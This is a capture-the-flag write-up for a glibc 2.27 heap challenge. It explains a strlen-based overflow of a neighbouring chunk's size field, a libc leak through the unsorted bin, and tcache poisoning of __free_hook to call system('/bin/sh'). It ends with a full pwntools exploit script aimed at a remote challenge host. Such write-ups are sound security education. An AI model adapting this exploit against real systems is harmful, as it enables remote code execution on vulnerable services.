---
title: Strategist
date: 2025-03-26:00:19+03:00
description: Writeup for Strategist [HTB Apocalypse 2025]
author: PineBel
tags:
- pwn 
- heap
draft: true 
---

## Challenge description

To move forward, Sir Alaric requests each member of his team to present their most effective planning strategy. The individual with the strongest plan will be appointed as the Strategist for the upcoming war. Put forth your best effort to claim the role of Strategist!

## Intuition

It looks like a classic heap challenge. We can control the size of malloc and write to that chunk. We can also remove (free) that chunk and edit its contents. We also get the libc version which is: `glibc 2.27`. 
I used `patchelf` to modify my binary to have the correct libc and ld.

**Vulnerability**: When editing a chunk, the edit function computes the length with strlen, which means that we can overwrite the size field of the next chunk if we make the current chunk full.

```C
    __nbytes = strlen((char *)mem_ptr[input_idx]);
    read(0,(void *)mem_ptr[input_idx],__nbytes);
```

Example (allocate two chunks of 24, fill the first one up):
```
                                    0x0000000000000021	........!....... <--- first chunk
0x555555a01670	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x555555a01680	0x0a61616161616161	0x0000000000000021	aaaaaaa.!....... <--- second chunk
0x555555a01690	0x0000000a42424242	0x0000000000000000	BBBB............
0x555555a016a0	0x0000000000000000	0x0000000000020961	........a.......	 <-- Top chunk
```

Now if we edit the first chunk, strlen() will also include the second chunks size, so we can overwrite the size if we want.

So the strategy for this challenge would be to leak a libc address and do tcache poisoning to the \_\_free\_hook (since we have 2.27 we can do that) 
## Solution

#### Leaking libc

1. Create a chunk that gets in the Unsorted bin (bc it has fwd ptr and bck ptr towards the main arena).
2. Guard the Unsorted bin chunk with a smaller chunk to prevent merging with the top.


After we allocate a large chuck and a smaller chunk + free the large chunk + allocate large again to get leak:
```
0x555574953660	0x0000000000000000	0x0000000000000431	........1.......
0x555574953670	0x00007ab6a23ebc61	0x00007ab6a23ebca0	a.>..z....>..z..
0x555574953680	0x0000000000000000	0x0000000000000000	................
```


So after the leak it's just a simple tcache poisoning.
Steps for tcache poisoning:

1. Allocate three chunks that will fit in the tcache.

```
0x55555d52e660	0x0000000000000000	0x0000000000000031	........1....... <--- C1
0x55555d52e670	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x55555d52e680	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x55555d52e690	0x6161616161616161	0x0000000000000031	aaaaaaaa1....... <--- C2
0x55555d52e6a0	0x6262626262626262	0x6262626262626262	bbbbbbbbbbbbbbbb
0x55555d52e6b0	0x6262626262626262	0x6262626262626262	bbbbbbbbbbbbbbbb
0x55555d52e6c0	0x6262626262626262	0x0000000000000031	bbbbbbbb1....... <--- C3
0x55555d52e6d0	0x6363636363636363	0x6363636363636363	cccccccccccccccc
0x55555d52e6e0	0x6363636363636363	0x6363636363636363	cccccccccccccccc
0x55555d52e6f0	0x6363636363636363
```

2. Use edit vuln to overwrite C2 size. This will allow us to overwrite C3 later.

```
0x555567480660	0x0000000000000000	0x0000000000000031	........1....... <--- C1
0x555567480670	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x555567480680	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x555567480690	0x6161616161616161	0x0000000000000061	aaaaaaaaa....... <--- C2 (NEW SIZE)
0x5555674806a0	0x6262626262626262	0x6262626262626262	bbbbbbbbbbbbbbbb
0x5555674806b0	0x6262626262626262	0x6262626262626262	bbbbbbbbbbbbbbbb
0x5555674806c0	0x6262626262626262	0x0000000000000031	bbbbbbbb1....... <--- C3
0x5555674806d0	0x6363636363636363	0x6363636363636363	cccccccccccccccc
0x5555674806e0	0x6363636363636363	0x6363636363636363	cccccccccccccccc
0x5555674806f0	0x6363636363636363
```

3. Free C2 and C3 

```
                                    0x0000000000000031	........1....... <--- C1
0x555582d1f670	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x555582d1f680	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x555582d1f690	0x6161616161616161	0x0000000000000061	aaaaaaaaa....... <--- C2 
0x555582d1f6a0	0x0000000000000000	0x0000555582d1f010	............UU..	 <-- tcachebins[0x60][0/1]
0x555582d1f6b0	0x6262626262626262	0x6262626262626262	bbbbbbbbbbbbbbbb
0x555582d1f6c0	0x6262626262626262	0x0000000000000031	bbbbbbbb1....... <--- C3
0x555582d1f6d0	0x0000000000000000	0x0000555582d1f010	............UU..	 <-- tcachebins[0x30][0/1]
0x555582d1f6e0	0x6363636363636363	0x6363636363636363	cccccccccccccccc
0x555582d1f6f0	0x6363636363636363
```

4. Allocate a chunk that fits in the 0x60 chunk size => we can overwrite C3 with the free hook

```
0x55555d4f7660	0x0000000000000000	0x0000000000000031	........1....... <--- C1
0x55555d4f7670	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x55555d4f7680	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x55555d4f7690	0x6161616161616161	0x0000000000000061	aaaaaaaaa....... <--- C2
0x55555d4f76a0	0x6363636363636363	0x6363636363636363	cccccccccccccccc
0x55555d4f76b0	0x6363636363636363	0x6363636363636363	cccccccccccccccc
0x55555d4f76c0	0x6363636363636363	0x3434343434343434	cccccccc44444444 <--- C3 overwritten  (6d0 -> __free_hook ptr)
0x55555d4f76d0	0x00007f2d071ed8e8	0x000055555d4f7010	....-....pO]UU..	 <-- tcachebins[0x30][0/1]
0x55555d4f76e0	0x6363636363636363	0x6363636363636363	cccccccccccccccc
0x55555d4f76f0	0x6363636363636363

tcachebins
0x30 [  1]: 0x55555d4f76d0 —▸ 0x7f2d071ed8e8 (__free_hook) 
```

5. Allocate a chunk that will contain the args for system.
6. Allocate a chunk with a ptr to sytem.

```
x/1xg &__free_hook
0x78ed30ded8e8 <__free_hook>:	0x000078ed30a4f550
pwndbg> x 0x000078ed30a4f550
0x78ed30a4f550 <system>:	0xfa66e90b74ff8548
```

7. Call free on the chunk that has /bin/sh


Solve:
```py
from pwn import *
import time

#context.binary = bin = ELF("./strategist")
libc   = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
#target = process([ld.path,bin.path],env={"LD_PRELOAD":libc.path})
target = remote("94.237.61.57",45450)


def allocate(size, p):
    target.sendlineafter(b'> ', b'1')
    target.sendlineafter(b'> ', str(size).encode())
    target.sendafter(b'> ', p)

def free(idx):
     target.sendlineafter(b'> ', b'4')
     target.sendlineafter(b'> ', str(idx).encode())

def show(idx):
    target.sendlineafter(b'> ', b'2')
    target.sendlineafter(b'> ', str(idx).encode())
    target.recvuntil(f'Plan [{idx}]: ')
    return target.recvline()[:-1]

def edit(idx,p):
    target.sendlineafter(b'> ', b'3')
    target.sendlineafter(b'> ', str(idx).encode())
    target.sendafter(b'> ', p)


allocate(0x420,b"a") # put in unsorted bin because it has 2 ptrs that we will leak 
allocate(0x100,b"b") # put tcache so that we don't merge with top chunk when we free

free(0)
free(1)

allocate(0x420,b"a") # this is the chunk with leak
leak = u64(show(0).ljust(8,b'\x00'))
leak = leak - 0x3ebc61
libc.address = leak
print(f"Leak:{leak:#010x}")
#print(hex(libc.sym.__free_hook))
free(0)


### Tcache poisoning

tcache_size = 0x28

allocate(tcache_size, tcache_size*b"a") # full chunk => leads to overflow
allocate(tcache_size, tcache_size*b"b") 
allocate(tcache_size, tcache_size*b"c")


edit(0,tcache_size*b"a"+p8(0x61)) # edit chunk so that we overwrite chunk size 
free(1)
free(2)

allocate(0x50,tcache_size*b"c"+b"4"*8+p64(libc.sym.__free_hook)) # this chunk will go into the one that overflows the second one (fwd_ptr), the second size actually doesn't matters (the 4)

allocate(tcache_size, b"/bin/sh\x00"+p64(0x0)) # prepare arg for system
allocate(tcache_size, p64(libc.sym.system)) # write system in free hook
#gdb.attach(target)
#pause()

print(show(2))
free(2) # call system with /bin/sh arg
target.interactive()
```




